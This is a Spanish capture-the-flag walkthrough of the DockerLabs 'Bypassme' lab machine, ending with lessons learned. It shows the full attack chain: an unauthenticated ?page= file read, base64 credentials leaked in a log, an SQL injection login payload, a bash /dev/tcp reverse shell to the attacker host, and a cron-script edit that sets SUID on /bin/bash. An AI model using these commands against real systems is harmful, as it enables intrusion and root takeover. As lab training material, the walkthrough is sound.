---
title: "DockerLabs - Bypassme"
difficulty: "Fácil"
source: "DockerLabs"
---

Information disclosure, fuzzing web y credential leakage combinados para conseguir acceso inicial, con lateral movement via socket Unix y escalada por cron job con eval.

## Despliegue

```bash
bash auto_deploy.sh bypassme.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH
- **80/tcp** — HTTP (Apache/2.4.58 Ubuntu)

## Enumeración web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

Archivos encontrados: `login.php`, `welcome.php`, `index.php`. Tanto `index.php` como `welcome.php` redirigen a `login.php`.

## Bypass de autenticación — Information disclosure

`index.php` acepta un parámetro `?page=` que carga ficheros sin verificar sesión:

```
http://172.17.0.2/index.php?page=welcome
```

Esto muestra el panel de administración sin autenticación. El HTML del panel contiene:

```html
<!-- dev note: remember to secure logs.txt path before deploy -->
[!] Warning: System error logs are exposed to the public folder
```

## Credential leakage — logs/logs.txt

```
http://172.17.0.2/index.php?page=/logs/logs.txt
```

El log expone credenciales en base64:

```
DEBUG: Trying password 'NGxiM3J0MTIz'  → albert : 4lb3rt123
DEBUG: Trying password 'YWRtaW4xMjM='  → admin123
DEBUG: Trying password 'dGVzdDEyMw=='  → test123
```

## Acceso alternativo — SQL injection

El campo `password` del login es vulnerable a SQLi:

```
username: admin
password: ' OR '1'='1 -- -
```

## Intrusión — SSH como albert

```bash
ssh albert@172.17.0.2
# password: 4lb3rt123
```

## Lateral movement — albert → conx

Enumerando procesos se descubre un socket Unix activo de conx:

```bash
ps aux | grep socat
# socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Conexión al socket:

```bash
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Abre una bash como conx. Para obtener terminal limpia, lanzar reverse shell desde ahí:

```bash
# Listener
nc -lvnp 5555

# Dentro del socat
bash -i >& /dev/tcp/172.17.0.1/5555 0>&1
```

## Escalada — conx → root

conx tiene permisos de escritura sobre `/var/backups/backup.sh`, que ejecuta cron como root:

```bash
cat /var/backups/backup.sh
```

```bash
#!/bin/bash
SRC="/home/conx"
DEST="/var/lib/.snapshots/backup.tar.gz"
echo "[*] Starting backup..."
tar -czf "$DEST" "$SRC" >/dev/null 2>&1
echo "[*] Backup completed at $(date)"
eval "$HOOK"
```

Inyectamos SUID en bash:

```bash
echo 'chmod +s /bin/bash' >> /var/backups/backup.sh
```

Esperamos a que corra el cron (máximo 1 minuto):

```bash
bash -p
whoami
# root
```

## Conclusión

Cadena de ataque completa:

1. **Reconocimiento** — nmap detecta puertos 22 y 80
2. **Information disclosure** — `index.php?page=welcome` carga el panel sin autenticación
3. **Credential leakage** — `?page=/logs/logs.txt` expone credenciales de albert en base64
4. **SSH** — acceso como albert con `4lb3rt123`
5. **Lateral movement** — socket Unix `/home/conx/.cache/.sock` abre shell como conx
6. **Escalada** — conx escribe en backup.sh → cron root ejecuta `chmod +s /bin/bash` → `bash -p`

**Lecciones aprendidas:**
- Parámetros `?page=` sin validación permiten bypassear autenticación y leer ficheros arbitrarios.
- Los logs de debug nunca deben ser accesibles públicamente — exponen credenciales, rutas y tokens.
- Sockets Unix expuestos con permisos incorrectos permiten lateral movement sin credenciales.
- `eval` con variables de entorno en scripts de cron es una escalada trivial si el script es escribible.
